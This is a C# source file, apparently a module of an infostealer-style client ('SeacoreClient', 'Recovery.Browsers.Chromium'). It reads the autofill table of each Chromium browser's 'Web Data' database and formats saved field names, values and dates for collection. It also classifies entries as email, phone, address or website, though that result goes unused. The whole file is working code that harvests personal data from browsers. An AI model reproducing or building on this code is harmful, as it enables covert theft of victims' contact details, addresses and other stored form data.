using System.Text.RegularExpressions;

namespace SeacoreClient.Features.Recovery.Browsers.Chromium
{
    public static partial class ChromiumAutofill
    {
        public static void Recover(string browserName, string relativeSearchPath)
        {
            string dbName = "Web Data";
            string query = ChromiumCommon.DbQueries["Autofill"];

            ChromiumCommon.ExecuteSqliteQueryAndProcessResults(
                browserName,
                dbName,
                query,
                reader =>
                {
                    string name = reader["name"].ToString();
                    string value = reader["value"].ToString();
                    long dateCreatedTicks = Convert.ToInt64(reader["date_created"].ToString());
                    DateTime dateCreated = ConvertFromUnixTimestamp(dateCreatedTicks);

                    long dateLastUsedTicks = Convert.ToInt64(reader["date_last_used"].ToString());
                    DateTime dateLastUsed = ConvertFromUnixTimestamp(dateLastUsedTicks);

                    string type = CategorizeAutofillEntry(name, value);

                    return $"Name: {name}\nValue: {value}\nDate Created: {dateCreated}\nDate Last Used: {dateLastUsed}\n";
                },
                ChromiumCommon.FileNames["Autofill"]);
        }

        private static DateTime ConvertFromUnixTimestamp(long unixTimestamp)
        {
            DateTime epoch = new(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
            return epoch.AddSeconds(unixTimestamp);
        }

        private static string CategorizeAutofillEntry(string name, string value)
        {
            var emailRegex = EmailRegex();
            if (emailRegex.IsMatch(value)) return "Email";

            var phoneRegex = PhoneRegex();
            if (phoneRegex.IsMatch(value)) return "Phone";

            var addressKeywords = new[] { "street", "address", "city", "state", "zipcode", "postal", "country" };
            if (addressKeywords.Any(keyword => name.Contains(keyword, StringComparison.InvariantCultureIgnoreCase)))
                return "Address";

            var websiteRegex = WebsiteRegex();
            if (websiteRegex.IsMatch(value)) return "Website";

            return "Other";
        }

        [GeneratedRegex(@"^\+?[0-9]{10,15}$")]
        private static partial Regex PhoneRegex();

        [GeneratedRegex(@"^https?:\/\/[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}(/\S*)?$")]
        private static partial Regex WebsiteRegex();

        [GeneratedRegex(@"^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$")]
        private static partial Regex EmailRegex();
    }
}
